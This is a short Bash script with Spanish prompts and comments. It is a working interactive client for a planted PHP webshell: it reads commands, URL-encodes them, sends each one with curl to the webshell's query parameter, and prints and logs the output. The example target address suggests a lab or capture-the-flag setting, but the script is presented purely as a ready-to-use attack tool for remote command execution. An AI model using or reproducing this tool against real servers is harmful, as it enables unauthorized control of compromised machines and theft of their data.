#!/bin/bash

# Colores para salida
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
redColour="\e[0;31m\033[1m"
endColour="\e[0m"

# Archivo de salida para guardar los resultados
output_file="webshell_output.txt"

# Función para manejar la salida con Ctrl+C
function ctrl_c() {
    echo -e "\n\n${redColour}[!] Saliendo... Los resultados se han guardado en $output_file${endColour}\n"
    exit 1
}

# Capturar señal Ctrl+C
trap ctrl_c INT

# Solicitar URL base
read -p "Introduce la URL base de la webshell (ejemplo: http://172.17.0.2/shell.php?parameter=): " url_base

# Bucle para continuar solicitando comandos
while true; do
    read -p "Introduce el comando a ejecutar (o 'exit' para salir): " comando

    # Reemplazar espacios con '+'
    comando=$(echo $comando | tr ' ' '+')

    if [ "$comando" == "exit" ]; then
        ctrl_c
    fi

    # Ejecutar el comando en la webshell
    respuesta=$(curl -s "${url_base}${comando}")

    # Mostrar la respuesta
    if [ -z "$respuesta" ]; then
        echo -e "\n${redColour}[!] No se encontró nada.${endColour}\n"
        echo -e "[!] Comando: ${comando}\n[!] Resultado: No se encontró nada.\n" >> $output_file
    else
        echo -e "\n${yellowColour}Salida del comando:${endColour}\n"
        echo -e "${respuesta}\n"
        echo -e "[+] Comando: ${comando}\n[+] Resultado:\n${respuesta}\n" >> $output_file
    fi
done
